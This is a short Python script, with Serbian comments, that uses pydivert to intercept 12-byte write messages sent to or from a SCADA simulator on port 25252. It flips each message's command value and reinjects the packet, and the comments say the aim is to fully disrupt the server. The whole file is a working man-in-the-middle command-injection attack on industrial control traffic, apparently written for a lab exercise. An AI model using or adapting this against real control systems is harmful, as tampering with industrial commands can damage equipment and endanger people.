import pydivert
"""
Sve write poruke su fiksno 12 bajtova 
Hvata ili one koje idu na port 25252(simulator scade) ili one koje idu na izvorni port 
Moraju se poruke uhvatiti u oba smera kako bi se skroz narusio server  
"""

def inject(packet,packetManipulator :pydivert):
    message = bytearray(packet.payload)
    value = int.from_bytes(message[10:12],byteorder='big')
    print(f"Packet pre injektovanja: {packet.payload}")
    print(f"Komanda pre injektovanja: {message[10:12]}")
    if value==1:
        value = 0
        maliciousCommand = value.to_bytes(2,byteorder='big')
        message[10:12] = maliciousCommand
        packet.payload = message
        print(f"Packet nakon injektovanja: {packet.payload}")
        print(f"Komanda pre injektovanja: {message[10:12]}")
        packetManipulator.send(packet)
    else:
        value = 1
        maliciousCommand = value.to_bytes(2,byteorder='big')
        message[10:12] = maliciousCommand
        packet.payload = message
        print(f"Packet nakon injektovanja: {packet.payload}")
        print(f"Komanda pre injektovanja: {message[10:12]}")
        packetManipulator.send(packet)


def comandInjection(sourcePort):
    with pydivert.WinDivert(f"(tcp.DstPort == 25252 or tcp.DstPort =={sourcePort}) and tcp.PayloadLength == 12") as w:
        for packet in w:
            match packet.dst_port:
                case 25252:
                    inject(packet,w)
                case sourcePort:
                    inject(packet,w)

